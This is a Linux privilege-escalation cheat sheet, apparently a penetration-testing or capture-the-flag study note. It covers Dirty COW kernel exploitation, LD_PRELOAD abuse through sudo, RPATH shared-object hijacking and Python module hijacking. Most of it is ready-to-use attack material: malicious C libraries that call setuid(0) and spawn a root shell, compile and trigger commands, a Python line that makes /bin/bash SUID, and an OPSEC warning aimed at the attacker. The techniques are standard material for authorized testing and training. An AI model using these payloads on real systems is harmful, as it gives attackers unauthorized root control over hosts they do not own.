# Kernel Exploits

**Concept:** Exploiting vulnerabilities in the Linux Kernel to execute arbitrary code with Ring 0 (root) privileges. This is often the "nuclear option" due to the risk of system instability. 
**Famous Examples:** Dirty COW (CVE-2016-5195), PwnKit (CVE-2021-4034), Dirty Pipe (CVE-2022-0847).
## 1. Identification
**Goal:** Determine the Kernel version and OS distribution.
```shell
# Description: Gather Kernel and OS version info
uname -a
cat /etc/lsb-release
# Or use tools like: linux-exploit-suggester.sh
```
## 2. Exploitation (Dirty COW Example)
**Scenario:** Target is running an older Kernel (e.g., 4.4.0) vulnerable to race conditions in the Copy-On-Write mechanism.
**Execution Flow:**
1. **Transfer:** Upload the exploit source code (`dirty.c`) to the target (usually `/tmp`). 
2. **Compile:** Use `gcc` to create the executable.    
```shell
# Syntax: gcc <Source> -o <Output> -pthread
gcc dirty.c -o dirty -pthread
```
3. **Execute:** Run the binary. It usually creates a new root user or overwrites a SUID binary like `/usr/bin/passwd`.    
```shell
./dirty
# Follow exploit instructions (e.g., su firefart)
```
**OPSEC Warning:** Kernel exploits can crash the system (Kernel Panic). Always check if the specific kernel sub-version is vulnerable before running. They also leave distinct traces in system logs (dmesg).
# Shared Library Abuse (LD_PRELOAD)
**Concept:** The `LD_PRELOAD` environment variable forces the dynamic linker to load a specified shared object (`.so`) _before_ any other library. If a user can run a command with `sudo` and the `env_keep+=LD_PRELOAD` option is set, they can inject malicious code into the privileged process.
## 1. Enumeration
**Goal:** Check `sudo -l` for the `env_keep` configuration.
```shell
sudo -l
# Look for: env_keep+=LD_PRELOAD
```
## 2. Exploitation
**Scenario:** User can run `/usr/sbin/apache2` as root, and `LD_PRELOAD` is preserved.
1. **Create Malicious Library (`root.c`):**
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0); setuid(0);
	system("/bin/bash");
}
```
2. **Compile:**
```shell
gcc -fPIC -shared -o /tmp/root.so root.c -nostartfiles
```
3. **Trigger:** Run the allowed sudo command specifying the library.
```shell
# Syntax: sudo LD_PRELOAD=<PathToSo> <AllowedCommand>
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```
# Shared Object Hijacking (RPATH/RUNPATH)
**Concept:** Binaries use a search path to find shared libraries. If a SUID binary specifies a custom `RUNPATH` (via RPATH) that allows a writable directory, an attacker can place a malicious library there to be loaded with root privileges.
## 1. Enumeration
**Goal:** Find SUID binaries and inspect their library dependencies and runpaths.
```shell
# 1. Check dependencies
ldd /path/to/suid_binary

# 2. Check RUNPATH
readelf -d /path/to/suid_binary | grep PATH
# Output: Library runpath: [/development]
```
## 2. Exploitation
**Scenario:** Binary `payroll` (SUID root) requires `libshared.so` and includes `/development` in RUNPATH. `/development` is world-writable.
1. **Identify Missing/Hijackable Function:** Run the binary or use `ltrace` to see which function it calls from the library (e.g., `dbquery`).
2. **Create Malicious Library:**
```c
#include <stdlib.h>
#include <unistd.h>
void dbquery() {
	setuid(0);
	system("/bin/sh -p");
}
```
3. **Compile & Place:**
```shell
gcc src.c -fPIC -shared -o /development/libshared.so
```
4. **Trigger:** Execute the SUID binary.
```shell
./payroll
```
# Python Library Hijacking
**Concept:** Python imports modules based on a priority list (`sys.path`). If an attacker can write to a directory that Python checks _before_ the standard library, or if a standard module has weak permissions, they can hijack the import to execute code.
## Vector 1: Writable Module Permissions
**Enumeration:** Check permissions of imported modules in a script running as root.
```shell
# Check where a module is installed
pip3 show psutil
# Check permissions
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```
**Exploitation:** If writable, append code to `__init__.py`.
```python
import os; os.system("chmod +s /bin/bash")
```
## Vector 2: Library Path Precedence
**Concept:** Python checks the current directory or directories listed in `PYTHONPATH` before system paths. **Enumeration:** Check `sys.path` order.
```shell
python3 -c 'import sys; print("\n".join(sys.path))'
```

**Exploitation:**
1. Find a directory in `sys.path` that is writable (e.g., `/usr/lib/python3.8` misconfigured).
2. Create a script with the same name as a module imported by the target script (e.g., `psutil.py`).
3. When the target script runs (as root), it loads your `psutil.py` instead of the real one.
## Vector 3: PYTHONPATH Environment Variable
**Concept:** If you can run a script via `sudo` and `SETENV` is allowed, you can override the module search path. 
**Prerequisite:** `sudo -l` shows `SETENV: NOPASSWD: /usr/bin/python3`.

**Exploitation:**
1. Create a malicious module (e.g., `psutil.py`) in `/tmp`.
2. Run the script setting `PYTHONPATH`.
```shell
sudo PYTHONPATH=/tmp/ /usr/bin/python3 /opt/admin_script.py
```